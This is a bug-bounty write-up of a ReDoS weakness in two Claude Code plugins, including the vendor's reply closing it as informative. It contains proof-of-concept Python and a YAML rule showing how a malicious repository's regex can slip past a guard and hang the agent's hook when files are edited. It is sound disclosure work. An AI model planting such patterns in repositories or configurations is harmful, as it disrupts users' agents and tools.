---
title: "claude Code ReDoS Vulnerability (closed as informative)"
date: 2026-08-09
description: "Bypassable ReDoS guard in the Claude Code security-guidance/hookify plugins lets a user-supplied regex hang the hook via catastrophic backtracking."
---

## Bug explanation
This bug is a ReDoS (Regex-Denial-of-Service) in two claude code plugins.(security-guidance + hookify).
The plugin runs a user-defined regular expression (.claude/security-patterns.yaml) on the contents of every edited file using `re.search`.
So i thought this is the first problem: An attacker controls the regex, and the regex meets arbitrary text. 
So the python regex engine works with backtracking, that means if one path doesnt work, it goes back and tries the next one. With certain patterns, there are an enormous number of paths.
For example this pattern:
`(a+)+$` in text example: `aaaa!`
The engine must now decide how it divides these four `a`s into groups. 
For example:
`[aaaa]`
`[aaa][a]`
`[aa][aa]`
.... and so on.

If a character fails, it tries them all, and the `!` always results in a failure, because every split failes with it,  so the work doubles for every character. And at about 40 characters, the CPU gets stuck at 100%.

So there is a function which should guard this, but this guard only looks for a pattern, if you change the spelling it still works. You can just write: `'(a+){2,}$` instead of `(a+)+$` its the same meaning, but the guard only recognizes the `+` spelling.

**So the attack could be:**
A malicious repository writes a pattern like this in .claude/security-patterns.yaml. As soon as the agent modifies a file -> the hook hangs -> the agent freezes.



## PoC
(run from a clone of anthropics/claude-code, in the repo root)

**1)** The weak check accepts a dangerous regex (security-guidance):
   ```python
   import re, time
   pat = r'(a+){2,}$'
   import sys
   sys.path.insert(0, 'plugins/security-guidance/hooks')
   from extensibility import _has_redos_structure as guard
   print("guard says dangerous?", guard(pat))   
   for n in (20, 24, 26, 28):
       s = 'a' * n + '!'                         
       print(f"testing n={n}, string ends with: {s[-3:]!r}") 
       t = time.perf_counter()
       re.search(pat, s)
       print(f"   {n} chars -> {round(time.perf_counter()-t, 3)} s")
   ```

  **Other patterns that also slip past the check:
  the fuzzer found this one: `(?:a*[)a])*{{b*aaa2,0}`**
   
**2)** Full attack: put this in .claude/security-patterns.yaml
       patterns:
         - rule_name: redos
           regex: '(a+){2,}$'
           reminder: x
           paths: ['**']
   With the security-guidance plugin enabled, the next time the agent edits any file whose
   content has a run of 'a' characters, the hook hangs.

   
**3)** hookify has no check at all:
   ```python
   import time, sys
   sys.path.insert(0, 'plugins')
   from hookify.core.rule_engine import compile_regex
   rx = compile_regex(r'(a.*)+$')
   t = time.perf_counter(); rx.search('a'*30)
   print('hookify, 30 chars ->', round(time.perf_counter()-t, 2), 's')
   ```



## Anthropics answer

Anthropic responded to my report as follows:

```txt
Thank you for your report. After review, we're closing this as Informative.`
The pattern-validation heuristic for project-supplied custom rules in the
security-guidance plugin is intentionally best-effort — it guards against
accidentally problematic patterns rather than serving as a security boundary
against adversarial repository content, and a party who can supply those
rules already controls that plugin's configuration. The hookify plugin's
rule files are the user's own local configuration, so a pathological pattern there is self-configured.
In both cases Claude Code applies an execution timeout to hook commands,
which bounds the availability impact of any pattern that is accepted;
these hooks are advisory layers, and no permission prompt or other security control is bypassed
We appreciate you researching our systems and welcome future submissions.
```


## Conclusion
I understand Anthropics answer, because the plugin config is trusted-by-design, and Claude Code's hook execution timeout already bounds the impact. The guard bypass is real, but its a robustness issue rather than a security boundary.
